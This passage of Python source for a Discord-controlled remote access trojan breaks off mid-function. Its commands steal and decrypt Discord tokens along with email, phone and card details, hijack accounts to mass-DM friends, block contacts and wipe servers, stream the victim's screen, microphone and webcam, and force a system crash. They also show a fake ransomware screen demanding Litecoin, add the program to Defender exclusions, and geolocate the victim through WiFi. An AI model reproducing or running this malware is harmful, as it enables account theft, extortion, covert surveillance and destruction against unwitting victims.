                                for enc_token in re.findall(r"dQw4w9WgXcQ:([^.*\['(.*)'\].*]{120,})", content):
                                    try:
                                        token_bytes = base64.b64decode(enc_token)
                                        dec_token = _decrypt_value(token_bytes, master_key)
                                        if dec_token and dec_token not in tokens: tokens.append(dec_token)
                                    except: pass
                    except: continue
            
            scripts = []
            for t in tokens:
                # Check validity
                r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': t})
                if r.status_code == 200:
                    u = r.json()
                    js = f"function login(token) {{ setInterval(() => {{ document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${{token}}\"` }}, 50); setTimeout(() => {{ location.reload(); }}, 2500); }} login(\"{t}\");"
                    scripts.append(f"**User:** `{u['username']}#{u['discriminator']}`\n**Script:**\n```javascript\n{js}\n```")
            return scripts
        except Exception as e: return [f"Error: {e}"]

    try:
        await ctx.send("Generating Discord login scripts...")
        scripts = await asyncio.to_thread(_gen_scripts)
        if not scripts:
            await ctx.send("No valid Discord tokens found.")
            return
        for s in scripts: await ctx.send(s)
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command(name="discord-grabber")
async def discord_grabber_cmd(ctx):
    def _get_token_info():  
        try:
            appdata = os.environ['APPDATA']
            paths = {
                'Discord': os.path.join(appdata, 'discord'),
                'Discord Canary': os.path.join(appdata, 'discordcanary'),
                'Discord PTB': os.path.join(appdata, 'discordptb'),
            }
            
            results = []
            for name, base_path in paths.items():
                leveldb_path = os.path.join(base_path, 'Local Storage', 'leveldb')
                if not os.path.exists(leveldb_path): continue
                
                master_key = _get_master_key(base_path)
                if not master_key: continue
                
                token = None
                for filename in os.listdir(leveldb_path):
                    if not filename.endswith(('.ldb', '.log')): continue
                    try:
                        with open(os.path.join(leveldb_path, filename), 'rb') as f:
                            content = f.read().decode('utf-8', errors='ignore')
                        for match in re.findall(r'dQw4w9WgXcQ:[^"\\]*', content):
                            enc_token = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                            decrypted = _decrypt_value(enc_token, master_key)
                            if decrypted:
                                token = decrypted
                                break
                    except: continue
                    if token: break
                
                if token:
                    headers = {'Authorization': token, 'Content-Type': 'application/json'}
                    # Using requests instead of urllib.request for consistency in bot.py
                    u_req = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                    if u_req.status_code == 200:
                        u = u_req.json()
                        report = f"**RAPED ({name})**\n"
                        report += f"**Username:** `{u.get('username')}#{u.get('discriminator')}`\n"
                        report += f"**Display Name:** `{u.get('global_name', 'N/A')}`\n"
                        report += f"**User ID:** `{u.get('id')}`\n"
                        report += f"**Email:** `{u.get('email', 'N/A')}`\n"
                        report += f"**Phone:** `{u.get('phone', 'N/A')}`\n"
                        report += f"**Token:** `{token}`\n\n"
                        
                        p_req = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers)
                        if p_req.status_code == 200:
                            payments = p_req.json()
                            if payments:
                                report += "**Payment Methods:**\n"
                                for pm in payments:
                                    brand = pm.get('brand', 'N/A')
                                    last_4 = pm.get('last_4', 'N/A')
                                    exp = f"{pm.get('expires_month')}/{pm.get('expires_year')}"
                                    report += f"- Brand: `{brand}` | Last 4: `{last_4}` | Expires: `{exp}`\n"
                            else:
                                report += "*No payment methods saved.*\n"
                        
                        nitro_report = _nitro_gifter_logic(token, headers, u)
                        if nitro_report:
                            report += "\n**Nitro Gifter Status:**\n" + nitro_report
                        
                        results.append(report)
            return results
        except Exception as e: return [f"Error: {e}"]

    await ctx.send("Extracting Discord tokens and checking for payment info...")
    infos = await asyncio.to_thread(_get_token_info)
    if not infos:
        await ctx.send("No Discord tokens found.")
    else:
        for info in infos:
            if len(info) > 2000:
                for i in range(0, len(info), 2000):
                    await ctx.send(info[i:i+2000])
            else:
                await ctx.send(info)

@bot.command(name="open")
async def open_proc_cmd(ctx, *, target):
    def _focus():
        import win32gui
        import win32process
        import win32api
        import win32con
        
        found = False
        def _enum(hwnd, _):
            nonlocal found
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd)
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                
                match = False
                # Try matching by PID
                if target.isdigit() and int(target) == pid: match = True
                # Try matching by Window Title
                elif target.lower() in title.lower(): match = True
                # Try matching by Process Name
                else:
                    try:
                        handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, pid)
                        exe = win32process.GetModuleFileNameEx(handle, 0)
                        win32api.CloseHandle(handle)
                        if target.lower() in os.path.basename(exe).lower(): match = True
                    except: pass
                
                if match:
                    # Bring to front
                    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
                    win32gui.SetForegroundWindow(hwnd)
                    found = True
        
        win32gui.EnumWindows(_enum, None)
        return found

    try:
        success = await asyncio.to_thread(_focus)
        if success:
            await ctx.send(f"Successfully focused window matching `{target}`.")
        else:
            await ctx.send(f"Could not find a window matching `{target}`.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

_DM_MAP = {} # {uid: discord_id}

@bot.command(name="display-dms")
async def display_dms_cmd(ctx):
    global _DM_MAP
    def _get_dms():
        try:
            # Get all unique tokens, prioritizing fresh files
            unique_tokens = set()
            appdata = os.environ['APPDATA']
            paths = {
                'Discord': os.path.join(appdata, 'discord'),
                'Discord Canary': os.path.join(appdata, 'discordcanary'),
                'Discord PTB': os.path.join(appdata, 'discordptb'),
            }
            
            for name, base_path in paths.items():
                leveldb_path = os.path.join(base_path, 'Local Storage', 'leveldb')
                if not os.path.exists(leveldb_path): continue
                master_key = _get_master_key(base_path)
                if not master_key: continue
                
                # Sort by freshness
                files = [os.path.join(leveldb_path, f) for f in os.listdir(leveldb_path) if f.endswith(('.ldb', '.log'))]
                files.sort(key=os.path.getmtime, reverse=True)

                for filepath in files:
                    try:
                        with open(filepath, 'rb') as f:
                            content = f.read().decode('utf-8', errors='ignore')
                        for match in re.findall(r'dQw4w9WgXcQ:[^"\\]*', content):
                            enc_token = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                            decrypted = _decrypt_value(enc_token, master_key)
                            if decrypted: unique_tokens.add(decrypted)
                    except: continue
            
            report = ""
            uid_counter = 1
            current_dm_map = {}
            
            for t in unique_tokens:
                headers = {'Authorization': t, 'Content-Type': 'application/json'}
                u_req = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                if u_req.status_code != 200: continue
                
                u = u_req.json()
                acc_info = f"\n**[ACCOUNT] {u['username']}#{u.get('discriminator', '0')} ({u.get('global_name', 'N/A')})**\n"
                report += acc_info
                
                r = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
                if r.status_code == 200:
                    channels = r.json()
                    # Sort by most recent activity
                    channels.sort(key=lambda x: int(x.get('last_message_id') or 0), reverse=True)
                    
                    report += "```\n"
                    for chan in channels:
                        if chan.get('type') == 1: # DM
                            recipient = chan['recipients'][0]
                            username = f"{recipient['username']}#{recipient.get('discriminator', '0')}"
                            disp_name = recipient.get('global_name', 'N/A')
                            rec_id = recipient['id']
                            
                            current_dm_map[str(uid_counter)] = (chan['id'], t, rec_id)
                            report += f"{uid_counter:3} | {username:<25} | {disp_name}\n"
                            uid_counter += 1
                            
                            # Discord message limit check
                            if len(report) > 1850:
                                report += "```... (Use next message for more)\n"
                                break 
                    if not report.endswith("more)\n"):
                        report += "```\n"
            
            return report, current_dm_map
        except Exception as e: return f"Error: {e}", {}

    await ctx.send("Fetching all DMs from all accounts, sorted by recent...")
    report, new_map = await asyncio.to_thread(_get_dms)
    _DM_MAP = new_map
    
    if not report:
        await ctx.send("No DMs found.")
        return

    # Split report into chunks for Discord
    if len(report) > 2000:
        for i in range(0, len(report), 2000):
            await ctx.send(report[i:i+2000])
    else:
        await ctx.send(report)

@bot.command(name="dm-uid")
async def dm_uid_cmd(ctx, uid: str, *, message: str):
    global _DM_MAP
    if uid not in _DM_MAP:
        await ctx.send(f"Error: UID `{uid}` not found. Run `!display-dms` first.")
        return
    
    chan_id, token, rec_id = _DM_MAP[uid]
    def _send():
        try:
            headers = {'Authorization': token, 'Content-Type': 'application/json'}
            final_msg = message.replace("@friend", f"<@{rec_id}>")
            r = requests.post(f'https://discord.com/api/v9/channels/{chan_id}/messages', 
                            headers=headers, json={"content": final_msg})
            if r.status_code == 200:
                return f"Successfully sent to UID `{uid}`"
            else:
                return f"Failed to send to UID `{uid}`: {r.status_code} - {r.text}"
        except Exception as e: return f"Error: {e}"

    res = await asyncio.to_thread(_send)
    await ctx.send(res)

@bot.command(name="mass-dm")
async def mass_dm_cmd(ctx, *, message: str):
    def _mass():
        try:
            # 1. Gather tokens
            paths = {
                'Discord': os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
                'Discord PTB': os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
            }
            tokens = []
            for name, path in paths.items():
                if not os.path.exists(path): continue
                master_key = _get_master_key(os.path.dirname(os.path.dirname(path)))
                for fn in os.listdir(path):
                    if not fn.endswith(('.log', '.ldb')): continue
                    try:
                        with open(os.path.join(path, fn), 'r', errors='ignore') as f:
                            content = f.read()
                            for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
                                if t not in tokens: tokens.append(t)
                            if master_key:
                                for enc_token in re.findall(r"dQw4w9WgXcQ:([^.*\['(.*)'\].*]{120,})", content):
                                    try:
                                        token_bytes = base64.b64decode(enc_token)
                                        dec_token = _decrypt_value(token_bytes, master_key)
                                        if dec_token and dec_token not in tokens: tokens.append(dec_token)
                                    except: pass
                    except: continue
            
            total_sent = 0
            details = ""
            
            for t in tokens:
                headers = {'Authorization': t, 'Content-Type': 'application/json'}
                # Get friends list
                r_friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
                if r_friends.status_code == 200:
                    friends = r_friends.json()
                    for friend in friends:
                        if friend.get('type') == 1: # Friend
                            f_id = friend['id']
                            f_user = friend['user']['username']
                            
                            # Create DM channel
                            r_dm = requests.post('https://discord.com/api/v9/users/@me/channels', 
                                               headers=headers, json={"recipient_id": f_id})
                            if r_dm.status_code == 200:
                                chan_id = r_dm.json()['id']
                                # Send message
                                final_msg = message.replace("@friend", f"<@{f_id}>")
                                r_send = requests.post(f'https://discord.com/api/v9/channels/{chan_id}/messages', 
                                                     headers=headers, json={"content": final_msg})
                                if r_send.status_code == 200:
                                    total_sent += 1
                                    details += f"Sent to: `{f_user}`\n"
                                    # Use a variable delay to mimic human behavior and bypass detection
                                    time.sleep(random.uniform(1.0, 5.0)) 
                
            return f"**Mass DM Complete!**\nTotal Sent: `{total_sent}`\n\n{details[:1500]}"
        except Exception as e: return f"Error: {e}"

    await ctx.send("Starting Mass DM to all friends across all found accounts...")
    res = await asyncio.to_thread(_mass)
    if len(res) > 2000:
        for i in range(0, len(res), 2000):
            await ctx.send(res[i:i+2000])
    else:
        await ctx.send(res)

@bot.command(name="block-all")
async def block_all_cmd(ctx):
    def _block():
        try:
            paths = {
                'Discord': os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
                'Discord PTB': os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
            }
            tokens = []
            for name, path in paths.items():
                if not os.path.exists(path): continue
                master_key = _get_master_key(os.path.dirname(os.path.dirname(path)))
                for fn in os.listdir(path):
                    if not fn.endswith(('.log', '.ldb')): continue
                    try:
                        with open(os.path.join(path, fn), 'r', errors='ignore') as f:
                            content = f.read()
                            for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
                                if t not in tokens: tokens.append(t)
                            if master_key:
                                for enc_token in re.findall(r"dQw4w9WgXcQ:([^.*\['(.*)'\].*]{120,})", content):
                                    try:
                                        token_bytes = base64.b64decode(enc_token)
                                        dec_token = _decrypt_value(token_bytes, master_key)
                                        if dec_token and dec_token not in tokens: tokens.append(dec_token)
                                    except: pass
                    except: continue
            
            total_blocked = 0
            for t in tokens:
                headers = {'Authorization': t, 'Content-Type': 'application/json'}
                r_friends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers)
                if r_friends.status_code == 200:
                    friends = r_friends.json()
                    for friend in friends:
                        f_id = friend['id']
                        # type 2 = Blocked
                        r_block = requests.put(f'https://discord.com/api/v9/users/@me/relationships/{f_id}', 
                                            headers=headers, json={"type": 2})
                        if r_block.status_code == 204:
                            total_blocked += 1
                            time.sleep(1.0) # Anti-rate-limit
            
            return f"**Block All Complete!**\nTotal Users Blocked: `{total_blocked}`"
        except Exception as e: return f"Error: {e}"

    await ctx.send("Starting to block all friends across all found accounts...")
    res = await asyncio.to_thread(_block)
    await ctx.send(res)

@bot.command(name="nuke-server")
async def nuke_server_cmd(ctx, guild_id: str):
    def _nuke():
        try:
            # 1. Gather tokens
            paths = {
                'Discord': os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
                'Discord PTB': os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
            }
            tokens = []
            for name, path in paths.items():
                if not os.path.exists(path): continue
                master_key = _get_master_key(os.path.dirname(os.path.dirname(path)))
                for fn in os.listdir(path):
                    if not fn.endswith(('.log', '.ldb')): continue
                    try:
                        with open(os.path.join(path, fn), 'r', errors='ignore') as f:
                            content = f.read()
                            for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
                                if t not in tokens: tokens.append(t)
                            if master_key:
                                for enc_token in re.findall(r"dQw4w9WgXcQ:([^.*\['(.*)'\].*]{120,})", content):
                                    try:
                                        token_bytes = base64.b64decode(enc_token)
                                        dec_token = _decrypt_value(token_bytes, master_key)
                                        if dec_token and dec_token not in tokens: tokens.append(dec_token)
                                    except: pass
                    except: continue
            
            report = f"**Starting Nuke on Guild ID:** `{guild_id}`\n"
            
            for t in tokens:
                headers = {'Authorization': t, 'Content-Type': 'application/json'}
                
                r_guild = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers)
                if r_guild.status_code != 200: continue
                
                r_channels = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
                if r_channels.status_code == 200:
                    channels = r_channels.json()
                    for chan in channels:
                        requests.delete(f'https://discord.com/api/v9/channels/{chan["id"]}', headers=headers)
                        time.sleep(0.5)
                
                r_roles = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
                if r_roles.status_code == 200:
                    roles = r_roles.json()
                    for role in roles:
                        try:
                            requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}', headers=headers)
                            time.sleep(0.5)
                        except: pass
                
                requests.patch(f'https://discord.com/api/v9/guilds/{guild_id}', headers=headers, 
                             json={"name": "NUKED BY ZYEN", "description": "This server has been destroyed.", "icon": None})
                
                report += f"Nuke executed using token: `{t[:20]}...`"
                return report
                
            return "Failed to find a token with permissions to nuke this server."
        except Exception as e: return f"Error: {e}"

    await ctx.send(f"Attempting to nuke server `{guild_id}`...")
    res = await asyncio.to_thread(_nuke)
    await ctx.send(res)

@bot.command(name="discord-logout")
async def discord_logout_cmd(ctx):
    def _logout():
        try:
            appdata = os.environ['APPDATA']
            paths = {
                'Discord': os.path.join(appdata, 'discord'),
                'Discord Canary': os.path.join(appdata, 'discordcanary'),
                'Discord PTB': os.path.join(appdata, 'discordptb'),
            }
            
            results = []
            for name, base_path in paths.items():
                leveldb_path = os.path.join(base_path, 'Local Storage', 'leveldb')
                if not os.path.exists(leveldb_path): continue
                
                # 1. Kill Discord process
                proc_name = name.lower().replace(" ", "") + ".exe"
                subprocess.run(f"taskkill /F /IM {proc_name}", shell=True, capture_output=True)
                
                # 2. Wipe LevelDB (where tokens are stored)
                try:
                    # We need to wait a bit for the process to fully close before deleting
                    time.sleep(1)
                    if os.path.exists(leveldb_path):
                        shutil.rmtree(leveldb_path)
                        os.makedirs(leveldb_path, exist_ok=True)
                        results.append(f"Logged out of `{name}` (Wiped session storage)")
                    else:
                        results.append(f"Session storage for `{name}` not found or already wiped.")
                except Exception as e:
                    results.append(f"Failed to wipe `{name}`: {e}")
            
            return results
        except Exception as e: return [f"Error: {e}"]

    await ctx.send("Attempting to force logout from all Discord clients...")
    res = await asyncio.to_thread(_logout)
    await ctx.send("\n".join(res) if res else "No Discord clients found to logout.")

_MONITOR_LIVE = False
_LAST_MSG = None

@bot.command()
async def monitor_live(ctx, interval: float = 1.0):
    global _MONITOR_LIVE, _LAST_MSG
    if _MONITOR_LIVE:
        await ctx.send("Live monitor is already running.")
        return
    
    _MONITOR_LIVE = True
    await ctx.send(f"Starting self-cleaning live stream in this channel (Interval: {interval}s).")
    
    while _MONITOR_LIVE:
        try:
            from PIL import ImageGrab
            import io
            
            # Capture
            screen = ImageGrab.grab()
            buf = io.BytesIO()
            screen.save(buf, format='JPEG', quality=60) # Quality 60 for speed
            buf.seek(0)
            
            # Send new and delete old to look "live"
            new_msg = await ctx.send(file=discord.File(buf, "stream.jpg"))
            
            if _LAST_MSG:
                try: await _LAST_MSG.delete()
                except: pass
            
            _LAST_MSG = new_msg
            await asyncio.sleep(interval)
        except Exception as e:
            await ctx.send(f"Stream Error: {e}")
            break
    
    _MONITOR_LIVE = False

_WEB_SERVER = None
_WEB_TUNNEL = None

class MJPEGHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=--frame')
            self.end_headers()
            while True:
                try:
                    screen = ImageGrab.grab()
                    buf = io.BytesIO()
                    screen.save(buf, format='JPEG', quality=50)
                    self.wfile.write(b'--frame\r\n')
                    self.send_header('Content-type', 'image/jpeg')
                    self.send_header('Content-length', str(len(buf.getvalue())))
                    self.end_headers()
                    self.wfile.write(buf.getvalue())
                    self.wfile.write(b'\r\n')
                    time.sleep(0.1) # ~10 FPS
                except: break
        else:
            self.send_response(404)
            self.end_headers()

@bot.command()
async def monitor_web(ctx):
    global _WEB_SERVER, _WEB_TUNNEL
    if _WEB_SERVER:
        await ctx.send("Web stream is already running.")
        return

    port = random.randint(10000, 20000)
    
    def _start_server():
        global _WEB_SERVER
        _WEB_SERVER = socketserver.TCPServer(("", port), MJPEGHandler)
        _WEB_SERVER.serve_forever()

    threading.Thread(target=_start_server, daemon=True).start()
    
    # Start SSH Tunnel (Windows 10+ has ssh by default)
    # Using localhost.run for stability
    tunnel_cmd = f"ssh -R 80:localhost:{port} nokey@localhost.run"
    _WEB_TUNNEL = subprocess.Popen(tunnel_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
    
    await ctx.send("Starting web stream tunnel...")
    
    # Wait for the tunnel URL to appear in stdout
    def _get_url():
        for _ in range(20): # Try for 20 seconds
            line = _WEB_TUNNEL.stdout.readline().decode('utf-8', errors='ignore')
            if "https://" in line:
                return re.search(r"https://[a-zA-Z0-9.-]+", line).group(0)
            time.sleep(1)
        return None

    url = await asyncio.to_thread(_get_url)
    if url:
        await ctx.send(f"**LIVE WEB STREAM STARTED!**\nView it here: {url}\nUse `!monitor_web_stop` to kill it.")
    else:
        await ctx.send("Failed to retrieve tunnel URL. SSH might be missing or serveo is down.")

@bot.command()
async def monitor_web_stop(ctx):
    global _WEB_SERVER, _WEB_TUNNEL
    if _WEB_SERVER:
        _WEB_SERVER.shutdown()
        _WEB_SERVER = None
    if _WEB_TUNNEL:
        subprocess.run("taskkill /F /T /PID " + str(_WEB_TUNNEL.pid), shell=True, capture_output=True)
        _WEB_TUNNEL = None
    await ctx.send("Web stream and tunnel stopped.")

@bot.command()
async def monitor_stop(ctx):
    global _MONITOR_LIVE
    _MONITOR_LIVE = False
    await ctx.send("Live monitor stopped.")

@bot.command()
async def stream_mic(ctx):
    if not ctx.author.voice:
        await ctx.send("You must be in a voice channel.")
        return
    
    vc = await ctx.author.voice.channel.connect()
    await ctx.send(f"Connected to `{ctx.author.voice.channel.name}`. Streaming microphone...")
    
    def _record_and_play():
        import sounddevice as sd
        import soundfile as sf
        import io
        fs = 48000
        while vc.is_connected():
            # Record 2 seconds of audio
            rec = sd.rec(int(2 * fs), samplerate=fs, channels=2, blocking=True)
            buf = io.BytesIO()
            sf.write(buf, rec, fs, format='OGG', subtype='OPUS')
            buf.seek(0)
            vc.play(discord.FFmpegPCMAudio(buf, pipe=True))
            while vc.is_playing(): time.sleep(0.1)
            
    threading.Thread(target=_record_and_play, daemon=True).start()

@bot.command()
async def stream_stop(ctx):
    if ctx.voice_client:
        await ctx.voice_client.disconnect()
        await ctx.send("Stopped streaming and disconnected.")
    else:
        await ctx.send("I am not in a voice channel.")

@bot.command()
async def bsod(ctx):
    try:
        ntdll = ctypes.windll.ntdll
        ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def invert_colors(ctx):
    try:
        mag = ctypes.windll.magnification
        mag.MagInitialize()
        m = [-1.0, 0.0, 0.0, 0.0, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 1.0, 1.0, 1.0, 0.0, 1.0]
        mag.MagSetFullscreenColorEffect(ctypes.byref((ctypes.c_float * 25)(*m)))
        await ctx.send("Inverted.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def restore_colors(ctx):
    try:
        mag = ctypes.windll.magnification
        mag.MagInitialize()
        m = [1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1.0]
        mag.MagSetFullscreenColorEffect(ctypes.byref((ctypes.c_float * 25)(*m)))
        # No MagUninitialize here as it can cause subsequent calls to fail
        await ctx.send("Restored.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def ransomware(ctx):
    try:
        def _show():
            import tkinter as tk
            from tkinter import messagebox
            r = tk.Tk()
            r.attributes("-fullscreen", True, "-topmost", True)
            r.configure(bg="black")
            r.protocol("WM_DELETE_WINDOW", lambda: None)
            tk.Label(r, text="All Your Files Have Been Encrypted", font=("Arial", 40, "bold"), fg="red", bg="black").pack(pady=50)
            t = "Instructions:\n\n1. Add zyen3x on Discord.\n2. Send $25 worth of LTC to the Crypto Wallet:\nLc5Bvs6EByqxVaTh5pBwyhHdJqwR8CKpQc\n\n3. DM zyen3x with proof you sent the crypto,\nthen you will get your key for your files to be unlocked."
            tk.Label(r, text=t, font=("Arial", 18), fg="white", bg="black").pack(pady=20)
            tk.Label(r, text="Enter Unlock Key:", font=("Arial", 14), fg="white", bg="black").pack(pady=10)
            e = tk.Entry(r, font=("Arial", 16), width=30, justify="center")
            e.pack(pady=10)
            e.focus_set()
            def c():
                if e.get() == "ZyenFilesBackup": r.destroy()
                else: messagebox.showerror("Error", "Incorrect key.")
            tk.Button(r, text="UNLOCK", command=c, font=("Arial", 14, "bold"), bg="red", fg="white", width=20).pack(pady=20)
            r.mainloop()
        threading.Thread(target=_show, daemon=True).start()
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def webcam_video(ctx, seconds: int = 10):
    def _record():
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return None
        fps, w, h = 20.0, int(cap.get(3)), int(cap.get(4))
        path = os.path.join(os.environ['TEMP'], "webcam.mp4")
        out = cv2.VideoWriter(path, cv2.VideoWriter_fourcc(*'mp4v'), fps, (w, h))
        st = time.time()
        while (time.time() - st) < seconds:
            ret, f = cap.read()
            if not ret: break
            out.write(f)
        cap.release()
        out.release()
        return path

    try:
        await ctx.send(f"Recording {seconds}s...")
        path = await asyncio.to_thread(_record)
        if path and os.path.exists(path):
            await ctx.send(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.send("Error: Recording failed.")
        gc.collect()
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def livevideo(ctx, seconds: int = 20):
    def _record():
        import cv2
        import numpy as np
        import mss
        f, p = 10, os.path.join(os.environ['TEMP'], "vid.mp4")
        with mss.mss() as sct:
            m = sct.monitors[1]
            o = cv2.VideoWriter(p, cv2.VideoWriter_fourcc(*'mp4v'), f, (m["width"], m["height"]))
            st = time.time()
            while (time.time() - st) < seconds:
                img = sct.grab(m)
                o.write(cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR))
                time.sleep(1/f)
            o.release()
        return p

    try:
        await ctx.send(f"Recording screen for {seconds}s...")
        path = await asyncio.to_thread(_record)
        await ctx.send(file=discord.File(path))
        os.remove(path)
        gc.collect()
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def emptybin(ctx):
    try:
        ctypes.windll.shell32.SHEmptyRecycleBinW(None, None, 1 | 2 | 4)
        await ctx.send("Recycle bin emptied.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def procs(ctx):
    def _get_procs():
        try:
            output = subprocess.check_output("tasklist", shell=True).decode('cp1252', errors='ignore')
            return output
        except Exception as e:
            return f"Error: {e}"

    try:
        output = await asyncio.to_thread(_get_procs)
        if len(output) > 1900:
            path = os.path.join(os.environ['TEMP'], "procs.txt")
            with open(path, "w") as f: f.write(output)
            await ctx.send("PROCESSES:", file=discord.File(path))
            os.remove(path)
        else:
            await ctx.send(f"PROCESSES:\n```\n{output}\n```")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def upload_url(ctx, url, filename):
    def _down():
        try:
            r = requests.get(url, stream=True, timeout=30)
            if r.status_code == 200:
                with open(filename, 'wb') as f: shutil.copyfileobj(r.raw, f)
                return True
            return False
        except: return False

    try:
        await ctx.send(f"Downloading `{filename}`...")
        success = await asyncio.to_thread(_down)
        if success:
            await ctx.send(f"Downloaded `{filename}` from URL.")
        else: await ctx.send("Failed to download.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def crit_process(ctx):
    try:
        ntdll = ctypes.windll.ntdll
        ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
        ntdll.RtlSetProcessIsCritical(1, 0, 0)
        await ctx.send("Process is now **CRITICAL**. Terminating it will cause BSOD.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def exclude_defender(ctx):
    try:
        path = os.path.abspath(sys.argv[0])
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin:
            await ctx.send("Warning: Bot is not running as Admin. Defender exclusion might fail.")
        
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
        process = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if process.returncode == 0:
            await ctx.send(f"Added `{os.path.basename(path)}` to Defender exclusions.")
        else:
            await ctx.send(f"Failed: `{process.stderr.strip()[:200]}`")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def search(ctx, ext):
    try:
        if not ext.startswith("."): ext = "." + ext
        found = []
        search_paths = [
            os.path.join(os.environ['USERPROFILE'], "Documents"),
            os.path.join(os.environ['USERPROFILE'], "Desktop")
        ]
        await ctx.send(f"Searching for `*{ext}` files...")
        for p in search_paths:
            for root, dirs, files in os.walk(p):
                for file in files:
                    if file.lower().endswith(ext.lower()):
                        found.append(os.path.join(root, file))
                if len(found) > 50: break
        
        if found:
            res = f"FOUND {len(found)} FILES:\n```\n" + "\n".join(found[:30]) + "\n```"
            if len(found) > 30: res += f"\n*...and {len(found)-30} more.*"
            await ctx.send(res[:2000])
        else:
            await ctx.send(f"No `*{ext}` files found.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def wifi_geo(ctx):
    def _get_geo():
        try:
            # Use netsh to scan for BSSIDs
            cmd = 'netsh wlan show networks mode=bssid'
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode('cp1252', errors='ignore')
            
            # Simple regex to extract MAC addresses (BSSIDs)
            bssids = re.findall(r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})", output)
            if not bssids:
                return "No nearby WiFi networks found for geolocation."
            
            # Try to resolve BSSIDs using Mozilla Location Service (MLS) and fallbacks
            geo_info = "Could not resolve any BSSID to a location."
            
            # Prepare payload for MLS (Mozilla)
            wifi_access_points = []
            for b in bssids[:10]:
                wifi_access_points.append({"macAddress": b})
            
            mls_payload = {"wifiAccessPoints": wifi_access_points}
            
            try:
                # 1. Try Mozilla Location Service (no API key required for low volume)
                r = requests.post("https://location.services.mozilla.com/v1/geolocate?key=geolocate", json=mls_payload, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    lat = data["location"]["lat"]
                    lon = data["location"]["lng"]
                    
                    # Reverse geocoding
                    addr = "N/A"
                    try:
                        rev = requests.get(f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lon}", headers={'User-Agent': 'Mozilla/5.0'}, timeout=5)
                        addr = rev.json().get("display_name", "N/A")
                    except: pass
                    
                    geo_info = f"**Location Found (via Mozilla)!**\nLatitude: `{lat}`\nLongitude: `{lon}`\nAddress: `{addr}`\nMaps: <https://www.google.com/maps/search/?api=1&query={lat},{lon}>"
                else:
                    # 2. Fallback to Mylnikov if MLS fails
                    for best_bssid in bssids[:3]:
